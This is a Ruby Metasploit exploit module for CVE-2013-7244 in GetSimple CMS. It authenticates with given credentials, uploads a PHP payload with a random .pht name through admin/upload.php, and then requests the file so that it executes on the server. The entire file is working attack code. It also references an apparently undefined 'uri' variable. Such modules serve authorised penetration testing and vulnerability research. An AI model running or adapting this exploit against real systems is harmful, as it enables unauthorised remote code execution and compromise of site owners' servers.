##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/php_exe'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'GetSimpleCMS PHP File Upload Vulnerability',
      'Description'    => %q{
        This module exploits a file upload vulnerability found in GetSimple CMS
        By abusing the upload.php file, a malicious authenticated user can upload an arbitrary file to a upload
        directory, which results in arbitrary code execution.
      },
      'Author'         =>
        [
          'Ahmed Elhady Mohamed'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2013-7244'],
          ['OSVDB', '93034']
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['Generic (PHP Payload)', {}]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 04 2014'
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The full URI path to GetSimplecms', '/GetSimpleCMS']) ,
      OptString.new('USERNAME', [true, 'The username that will be used for authentication process']) ,
      OptString.new('PASSWORD', [true, 'The right password for the provided username']) ,
      OptString.new('Upload_dir', [true, 'The upload directory, where uploaded files are located', '/data/uploads/'])
    ], self.class)
  end

  def send_request_auth
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path.to_s, "admin", "index.php"),
      'vars_post' => {
        'userid'    => "#{datastore['USERNAME']}",
        'pwd'       => "#{datastore['PASSWORD']}",
        'submitted' => 'Login'
      }
    })

    res
  end

  def send_request_upload(payload_name, cookie_http_header)
    data = Rex::MIME::Message.new
    data.add_part("<?php #{payload.encoded} ?>", 'application/x-httpd-php', nil, "form-data; name=\"file[]\"; filename=\"#{payload_name}\"")
    data.add_part("Upload", nil, nil, "form-data; name=\"submit\"")

    data_post = data.to_s

    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path.to_s, "admin", "upload.php"),
      'vars_get' => { 'path' =>'' },
      'cookie'   => cookie_http_header,
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'data'     => data_post
    })

    res
  end

  def exploit
    print_status("#{peer} - Authenticating...")
    res = send_request_auth

    if res && res.code == 302
      print_status("#{peer} - The authentication process is done successfully!")
    else
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    end

    print_status("#{peer} - Extracting Cookies Information...")
    cookie = res.get_cookies
    if cookie.blank?
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    end

    print_status("#{peer} - Uploading payload...")
    payload_name = rand_text_alpha(rand(10) + 5) + '.pht'
    res = send_request_upload(payload_name, cookie)

    if res
      print_status("#{res}\n#{res.body}")
    end
    print_status("#{peer} - Uploading #{payload_name.downcase} File.")

    upload_dir = datastore['Upload_dir']
    upload_uri = normalize_uri(uri, upload_dir, payload_name.downcase)

    print_status("#{peer} - Executing payload #{payload_name.downcase}")
    send_request_raw({
      'uri' => upload_uri,
      'method' => 'GET'
    }, 5)
  end

end
